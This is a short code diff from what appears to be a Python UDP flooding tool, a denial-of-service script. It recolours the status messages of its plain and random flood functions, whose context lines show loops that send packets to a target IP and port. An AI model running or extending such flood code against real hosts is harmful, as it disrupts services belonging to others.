@@ -35,7 +35,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print(f"[*]\033[94m Starting UDP Plain flood on\033[36m {ip}:\033[33m{port}\033[32m with {packet_count}.")
+            print(f"[*]\033[94m Starting UDP Plain flood on\033[36m {ip}\033[37m:\033[33m{port}\033[33m with {packet_count}.")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
@@ -53,7 +53,7 @@ def udp_random_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[36mStarting UDP Random flood on \033[32m{ip}\033[37m:\033[33m{port}\033[97m{packet_count} packets.")
+            print("\033[36m Starting UDP Random flood on \033[38;5;39m{ip}\033[37m:\033[33m{port}\033[97m{packet_count} packets.")
             payload = random.randbytes(packet_size)  # Random payload
             sock.sendto(payload, (ip, port))
             packet_count += 1
